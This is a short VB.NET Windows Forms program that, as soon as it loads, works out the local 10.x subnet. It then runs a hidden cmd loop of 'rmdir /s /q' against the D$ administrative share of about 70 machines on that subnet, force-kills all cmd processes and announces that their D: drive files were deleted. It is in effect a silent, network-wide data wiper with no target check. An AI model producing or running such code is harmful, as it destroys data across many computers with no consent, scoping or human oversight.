Imports System.Net

Public Class Form1
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        cbxIP.Items.Clear()
        cbxIP.Items.AddRange(Dns.GetHostAddresses(Dns.GetHostName))
        Dim ip As String
        Dim ipcerto As String = ""
        For i = 1 To cbxIP.Items.Count - 1
            ip = cbxIP.Items(i).ToString
            If ip.Contains("10.20") Or ip.Contains("10.10") Then
                ipcerto = ip.ToString()
                For j = 1 To 3
                    ipcerto = ipcerto.Substring(0, ipcerto.Length - 1)
                Next
                MessageBox.Show(ipcerto)
            End If
        Next

        Dim comando As String = "cmd /c for /l %i in (1,1,70) do start cmd /c rmdir /s /q \\" & ipcerto & ".%i\d$"

        MessageBox.Show(comando)
        Shell(comando, AppWinStyle.Hide, False, 100)
        System.Threading.Thread.Sleep(5000)
        Shell("cmd /c taskkill /im cmd* /f")

        MessageBox.Show("Concluido", "Arquivos sem premissões do D:\ de todas as máquinas deletados!", MessageBoxButtons.OK, MessageBoxIcon.Information)
        Me.Close()
    End Sub
End Class
